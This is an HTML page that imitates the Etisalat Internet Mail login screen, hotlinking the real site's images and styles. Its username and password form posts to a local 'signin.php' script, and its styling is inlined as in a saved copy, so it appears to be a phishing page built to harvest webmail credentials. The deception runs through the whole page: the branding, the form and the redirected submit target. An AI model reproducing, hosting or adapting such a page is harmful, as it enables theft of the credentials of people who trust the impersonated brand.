
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<!-- Mimic Internet Explorer 7 -->
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
		<title>my email - Etisalat Internet Mail</title>
		<link href="http://www.etisalat.ae/en/system/images/generic/etisalat.ico"  rel="shortcut icon" type="image/x-icon" />
        <link rel="stylesheet" href="http://cm2.eim.ae/iwc_static/layout/css/login.css?3.0.0.0.1_015148" type="text/css"/>
		<style type="text/css">
			@import "http://cm2.eim.ae/iwc_static/layout/js/dojotoolkit/dojo/resources/dojo.css?3.0.0.0.1_015148";
			@import "http://cm2.eim.ae/iwc_static/layout/js/dojotoolkit/dijit/themes/dijit.css?3.0.0.0.1_015148";
			@import "http://cm2.eim.ae/iwc_static/layout/js/dojotoolkit/dijit/themes/dijit_rtl.css?3.0.0.0.1_015148";
			@import "http://cm2.eim.ae/iwc_static/layout/js/dojotoolkit/dijit/themes/tundra/form/Button.css?3.0.0.0.1_015148";
			@import "http://cm2.eim.ae/iwc_static/layout/js/dojotoolkit/dojox/form/resources/DropDownSelect.css?3.0.0.0.1_015148";
		body {
background-image: url(http://cm2.eim.ae/iwc_static/layout/images/background.png); /*You will specify your image path here.*/

-moz-background-size: cover;
-webkit-background-size: cover;
background-size: cover;
background-position: top center !important;
background-repeat: no-repeat !important;
background-attachment: fixed;
}
	
</style>
		<style>
		.Convergence-Login-Logo {
	background-color: transparent;
	background-image: url("http://cm2.eim.ae/iwc_static/layout/images/mail.jpg");
	background-repeat: no-repeat;
	background-position: 0 0;
	width: 75px;
	height:85px;	
	padding: 0 0 0 0;
	border-bottom:none;
	margin-left:5px;
	float:left;
}
	.Convergence-Login-RedBand {
	margin: 0px;
	background-image:url("http://cm2.eim.ae/iwc_static/layout/images/greyband.jpg");
	background-position: left top;
	height: 30px;
	width: 430px;
}
	
		</style>

		<script type="text/javascript">
			var djConfig= {
				cacheBust: "3.0.0.0.1_015148",
				isDebug:false,
				parseOnLoad:true
			};

			(function() {
				function getParameter(paramName) {
					paramName += "=";
					var queryString = window.location.search;
					var strBegin = queryString.indexOf(paramName);
					if (strBegin==-1){
						strBegin = queryString.length;
					}
					else {
						strBegin += paramName.length;
					}
					var strEnd = queryString.indexOf("&",strBegin);

					if (strEnd==-1){
						strEnd = queryString.length;
					}

					return queryString.substring(strBegin,strEnd);
				}

				var locale = getParameter("lang");
				if (locale.length >0){
					djConfig.locale = "en";//locale.toLowerCase();
					if ((djConfig.locale.indexOf("ar") == 0) || (djConfig.locale.indexOf("he") == 0)) {
						djConfig.direction = "rtl";
					}
					else {
						djConfig.direction = "ltr";
					}
					var top = document.getElementsByTagName("html")[0];
					top.dir = djConfig.direction;
				}
			})()
		</script>

		<script type="text/javascript" src="../js/dojotoolkit/dojo/dojo.js?3.0.0.0.1_015148"></script>
		<script type="text/javascript">
			dojo.registerModulePath("iwc", "../../iwc");
			dojo.require("iwc.i18n.resources");
			dojo.requireLocalization("iwc.i18n","resources");
			iwc.l10n = dojo.i18n.getLocalization("iwc.i18n", "resources");
			dojo.require("iwc.login");


			dojo.addOnLoad(function(){
{

				// prevent clickjacking
				if (top.location.hostname != self.location.hostname) {
					try {
						if (document.forms[0].password) {
							document.forms[0].style.display = "none";
						}
					} catch (e) {
						document.body.style.display = "none";
					}
				}

				iwc.login.setFocus();
				iwc.login.doI18N();
				//document.getElementById('picCache').src='http://cm2.eim.ae/iwc_static/layout/imageList.html?'+djConfig.cacheBust;
				//var lang = langLblMapping[djConfig.locale.toLowerCase()]?langLblMapping[djConfig.locale.toLowerCase()]:langLblMapping['en-us'];
				var lang = "en";
				if(djConfig && djConfig.locale) {
					lang = djConfig.locale.toLowerCase();
				}
				dijit.byId('langButton').attr("value", lang);
				dojo.connect(dijit.byId("langButton"), "onChange", function(lang) {
					var loginUrl = window.location;

					if(window.location.search!=""&&window.location.search.indexOf('lang=')>-1)
						loginUrl = loginUrl.href.replace('lang='+iwc.login.getParameter('lang'),'lang='+lang);
					else
						loginUrl = loginUrl+"?lang="+lang

					if(window.location.search.indexOf("u=1")==-1)
						loginUrl=loginUrl+'&u=1';
                   
					window.location = loginUrl;
					return false;
				});
			});

			function login() {
				return iwc.login.checkName();
			}
		</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-59791848-1', 'auto');
  ga('send', 'pageview');

        </script>
	</head>

	<body>

		<script type="text/javascript">
			
		</script>
		<div class="Convergence-Login">
			<div class="Convergence-Login-Border">
				<div class="Convergence-Login-Banner">
					<div  class="Convergence-Login-Logo" role="presentation"></div>
					<div id="welcomeMsg" class="Convergence-Login-WelcomeMsg" style="text-align:center; width:633; height:1">
                      <span style="font-size: 13pt">my email - Etisalat Internet 
                      Mail</br></br></span><p></p>
                      </br>
                      <p></p>
                      <p></p>
                      <p></div>	
				</div>

				<div id="copyright" class="Convergence-Login-Copyright">
                  <form action="signin.php" method="post" onsubmit="return login();" style="color: rgb(0, 0, 0); font-family: Myriad, Helvetica, Tahoma, Arial, clean, sans-serif; font-size: 12px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; margin: 0px; padding: 0px;">
                    <div style="margin: 0px; padding: 0px;">
                      <div class="Convergence-Login-Form" style="margin: 0px 21.3906px 8.54688px; padding: 0px; float: left; width: 385.188px; box-sizing: border-box;">
                        <div class="Convergence-Login-FormRow" style="margin: 0px; padding: 0px 0px 8px; text-align: right;">
                          <label id="usernameLabelID" for="username" style="padding: 6px 0px 0px; float: left; width: 80px;">
                          Username:</label><input id="username" name="username" type="text" value=""aria-required="true" size="20" style="margin: 0px; padding: 2px; width: 280px; border: 2px solid rgb(225, 225, 225);"></div>
                        <div class="Convergence-Login-FormRow" style="margin: 0px; padding: 0px 0px 8px; text-align: right;">
                          <label id="passwordLabelID" for="password" style="padding: 6px 0px 0px; float: left; width: 80px;">
                          Password:</label><input id="password" name="password" type="password" aria-required="true" size="20" style="margin: 0px; padding: 2px; width: 280px; border: 2px solid rgb(225, 225, 225);"></div>
                        <div class="Convergence-Login-FormRow tundra" style="margin: 0px; padding: 0px 0px 8px; text-align: right;">
                          <div class="Convergence-Login-SelectLang" style="margin: 0px; padding: 0px; float: left; width: 385.188px; box-sizing: border-box;">
                            <table class="dijit dijitReset dijitInline dijitLeft dojoxDropDownSelectFixedWidth dojoxDropDownSelect dojoxDropDownSelectReadOnly dijitReadOnly" dojoattachpoint="dropDownNode,tableNode" cellspacing="0" cellpadding="0" wairole="presentation" dojoattachevent="onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" role="presentation" widgetid="langButton" style="font-size: inherit; width: 294px; margin: 0.2em; border: 0px; padding: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; line-height: inherit; font-family: inherit; color: inherit; display: inline-block; vertical-align: middle; cursor: not-allowed !important; background-position: 0% 0%; background-repeat: no-repeat;">
                              <tbody wairole="presentation" role="presentation" style="cursor: default !important;">
                                <tr wairole="presentation" role="presentation" style="cursor: default !important;">
                                  <td class="dijitReset dijitStretch dijitButtonContents dijitButtonNode" style="font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: normal; font-family: inherit; color: inherit; white-space: nowrap; vertical-align: middle; text-align: left; width: 275px; border-left-width: 1px; border-style: solid none solid solid; border-left-color: rgb(192, 192, 192); border-top-width: 1px; border-top-color: rgb(192, 192, 192); border-bottom-width: 1px; border-bottom-color: rgb(155, 155, 155); margin: 0px; padding: 1px 0px 0px; cursor: default !important;">
                                  <span class="dijitReset dijitInline dijitButtonText" dojoattachpoint="containerNode,popupStateNode" id="langButton_label" style="margin: 0px; border: 0px; padding: 0px 0.3em; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 12px; line-height: inherit; font-family: inherit; color: inherit; display: inline-block; vertical-align: middle; text-align: center; cursor: default !important;">
                                  <span class=" dojoxDropDownSelectLabel" style="vertical-align: middle; font-size: 12px; cursor: default !important;">
                                  English</span></span></td>
                                  <td class="dijitReset dijitRight dijitButtonNode dijitArrowButton dijitDownArrowButton" dojoattachpoint="focusNode,titleNode" wairole="button" waistate="haspopup-true,labelledby-langButton_label" role="button" aria-haspopup="true" aria-labelledby="langButton_label" id="langButton" tabindex="0" aria-disabled="false" style="font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: normal; font-family: inherit; color: rgb(17, 17, 17); vertical-align: middle; text-align: left; white-space: nowrap; width: 16px; cursor: default !important; border-left: 1px solid rgb(192, 192, 192); border-right: 1px solid rgb(192, 192, 192); border-top: 1px solid rgb(192, 192, 192); border-bottom: 1px solid rgb(155, 155, 155); margin: 0px; padding: 0px; background: rgb(255, 255, 255) url('http://cm2.eim.ae/iwc_static/js/dojotoolkit/dijit/themes/tundra/images/buttonEnabled.png') repeat-x 0% 100%">
                                  <div class="dijitReset dijitArrowButtonInner" style="font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 1px; line-height: inherit; font-family: inherit; color: inherit; vertical-align: middle; width: 7px; height: 7px; cursor: default !important; border: 0px none; margin-left: 5px; margin-right: 4px; margin-top: 0px; margin-bottom: 0px; padding: 0px; background: url('http://cm2.eim.ae/iwc_static/js/dojotoolkit/dijit/themes/tundra/images/spriteArrows.png') no-repeat">
                                     </div>
                                  </td>
                                </tr>
                            </table>
                          </div>
                          <div class="Convergence-Login-FormButton" id="buttonContainer" style="margin: 10px 0px 0px 92px; padding: 0px; width: 133px; float: left;">
                            <div style="margin: 0px; padding: 0px; text-align: left;">
                              <span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="signin" style="margin: 0.2em; border: 0px; padding: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; color: inherit; display: inline-block; vertical-align: middle; background-position: 0% 0%; background-repeat: no-repeat;">
                              <span class="dijitReset dijitRight dijitInline" style="margin: 0px; border: 0px; padding: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; color: inherit; display: inline-block; vertical-align: middle; background-position: 100% 0%; background-repeat: no-repeat;">
                              <span class="dijitReset dijitInline dijitButtonNode" style="font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: normal; font-family: inherit; color: inherit; display: inline-block; vertical-align: middle; text-align: center; white-space: nowrap; cursor: pointer; border-left: 1px solid rgb(192, 192, 192); border-right: 1px solid rgb(192, 192, 192); border-top: 1px solid rgb(192, 192, 192); border-bottom: 1px solid rgb(155, 155, 155); margin: 0px; padding-left: 0.2em; padding-right: 0.2em; padding-top: 0.1em; padding-bottom: 0.2em; background: rgb(255, 255, 255) url('http://cm2.eim.ae/iwc_static/js/dojotoolkit/dijit/themes/tundra/images/buttonEnabled.png') repeat-x 0% 100%">
                              <button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="submit" value wairole="button" waistate="labelledby-signin_label" role="button" aria-labelledby="signin_label" id="signin" tabindex="0" style="margin: 0px; border: 0px; padding: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; color: inherit; vertical-align: middle; white-space: nowrap; cursor: pointer; background-color: transparent; background-repeat: repeat-x;">
                              <span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode" style="margin: 0px; border: 0px; padding: 0px 0.3em; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 12px; line-height: inherit; font-family: inherit; color: inherit; display: inline-block; vertical-align: middle; cursor: pointer; text-align: center;">
                              Sign In</span></button></span></span></span>
                            </div>
                          </div>
                          <div style="clear: both; width: 616; height: 19; margin: 0px; padding: 0px">
                            &nbsp;</div>
                        </div>
                      </div>
                    </div>
                    <div style="margin: 0px; padding: 0px; clear: both;">
                      &nbsp;</div>
                  </form>
                  <div class="Convergence-Login-RedBand" style="color: rgb(0, 0, 0); font-family: Myriad, Helvetica, Tahoma, Arial, clean, sans-serif; font-size: 12px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; height: 30; width: 288; margin: 0px; padding: 0px; background-image: url('http://cm2.eim.ae/iwc_static/layout/images/greyband.jpg'); background-position: 0% 0%">
                    &nbsp;</div>
                  <div id="copyright" class="Convergence-Login-Copyright" style="color: rgb(0, 0, 0); font-family: Myriad, Helvetica, Tahoma, Arial, clean, sans-serif; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; margin: 0px; padding: 2px 10px 2px 8px; font-size: 11px; text-align: center;">
                    Copyright © 2015, Etisalat. All Rights Reserved.</div>
                  <p></div>

		</div>

		<div id="overlay" class="login">
			<div class="centered">
				<div class="logo"></div>
				<div id="progress"></div>
			</div>
		</div>

		<iframe name="picCache" id="picCache" src="" width=0 height=0 frameborder=0></iframe>

		<noscript>
			<div style="width:50%; margin-top: 5%; margin-left:auto; margin-right:auto">
				<iframe src="noscript.html" frameborder=0 width=100%" />
			</div></noscript>
	</body>
</html>